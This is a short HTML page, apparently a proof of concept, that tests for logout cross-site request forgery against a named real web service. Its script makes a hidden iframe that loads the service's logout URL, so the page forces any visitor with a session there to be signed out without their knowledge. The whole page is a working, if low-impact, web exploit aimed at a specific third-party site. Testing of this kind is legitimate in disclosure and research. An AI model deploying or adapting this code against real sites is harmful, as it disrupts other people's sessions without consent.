<!DOCTYPE html>
<html>
<head>
    <title>Logout CSRF Test</title>
</head>
<body>
    <h2>Logout CSRF Security Test</h2>

    <button onclick="testLogout()">Test Logout CSRF</button>

    <script>
        function testLogout() {
            const frame = document.createElement("iframe");

            frame.style.display = "none";

            frame.src = "https://www.aweber.com/users/account/logout";

            document.body.appendChild(frame);
        }
    </script>
</body>
</html>
